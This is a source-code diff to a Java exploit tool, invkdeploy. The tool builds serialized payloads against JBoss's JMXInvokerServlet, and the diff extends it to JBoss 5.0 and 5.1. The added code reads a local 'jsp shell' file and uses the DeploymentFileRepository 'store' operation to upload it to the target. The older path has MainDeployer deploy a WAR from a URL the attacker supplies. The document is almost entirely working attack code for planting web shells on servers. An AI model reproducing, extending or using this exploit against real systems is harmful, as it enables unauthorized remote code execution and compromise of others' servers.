@@ -1,6 +1,8 @@
 import java.net.URL;
 import java.util.Map;
 import java.util.HashMap;
+import java.util.Scanner;
+import java.io.File;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
@@ -22,8 +24,12 @@ import javax.management.ObjectName;
 
     http://breenmachine.blogspot.com/2013/09/jboss-jmxinvokerservlet-exploit.html
 
- This file takes three arguments: [version] [remote url] [local url], and is called
- from deployer_utils/
+ This file takes three arguments: [version] [remote url] and the third, which depends
+ entirely on the version you're deploying to.  5.x should be the absolute path to the
+ deploying JSP.  4.x and 3.x should be the local URL to deploying war.
+
+ 5.x is broken and we cannot invoke the main deployer; instead, we invoke the DFS
+ deployer and push up a JSP.
  */
 public class invkdeploy{
     private static Map<String, Integer> populateHashes(){
@@ -31,7 +37,13 @@ public class invkdeploy{
         versions.put("3.2", 647347722); // tested against 3.2.7.GA
         versions.put("4.0", 647347722); // tested against 4.0.5.GA
         versions.put("4.2", 647347722); // tested against 4.2.3.GA
+        versions.put("5.0", -483630874); // tested against 5.0.0
+        versions.put("5.1", -483630874); // tested against 5.1.0
         return versions;
+    }
+
+    private static String readJsp(String path) throws Exception {
+        return new Scanner(new File(path)).useDelimiter("\\A").next();
     }
 
     public static void main (String args[]) throws Exception {
@@ -42,6 +54,12 @@ public class invkdeploy{
         Integer hash;
         String remote_url;
         String local_url;
+
+        // 5.x settings
+        String jsp_shell = null;    // jsp shell
+        String jsp_path = null;     // jsp abs path
+        String jsp = null;          // jsp full name
+        String jsps = null;         // jsp stripped of extension
 
         Object[] file_list;
         String save_location = "payload.out";
@@ -56,6 +74,18 @@ public class invkdeploy{
             if(hash == null){
                 System.out.println("Version unsupported");
                 return;
+            }
+
+            // parse 5.x settings
+            if(version.equals("5.0") || version.equals("5.1")){
+                jsp_path = local_url;
+                jsp_shell = readJsp(jsp_path);
+                if(jsp_shell == null){
+                    return;
+                }
+
+                jsp = jsp_path.substring(jsp_path.lastIndexOf("/") + 1);
+                jsps = jsp.split("\\.")[0];
             }
         }
         catch(Exception e){
@@ -73,12 +103,24 @@ public class invkdeploy{
                                                       java.lang.String[].class);
         payload.setMethod(method);
 
-        file_list = new Object[]{ 
-                      new javax.management.ObjectName("jboss.system:service=MainDeployer"),
-                      "deploy",
-                      new String[]{ local_url },
-                      new String[]{ "java.lang.String" }
-                    };
+        if(version.equals("5.0") || version.equals("5.1")){
+            file_list = new Object[]{
+                    new javax.management.ObjectName("jboss.admin:service=DeploymentFileRepository"),
+                    "store",
+                    new Object[]{String.format("%s.war", jsps), jsps, ".jsp", jsp_shell, true},
+                    new String[]{"java.lang.String", "java.lang.String", "java.lang.String",
+                                 "java.lang.String", "boolean"}
+            };
+        }
+        else{
+            file_list = new Object[]{ 
+                        new javax.management.ObjectName("jboss.system:service=MainDeployer"),
+                        "deploy",
+                        new String[]{ local_url },
+                        new String[]{ "java.lang.String" }
+                      };
+        }
+
         payload.setArguments(file_list);
 
         FileOutputStream fileOut = new FileOutputStream(save_location); 
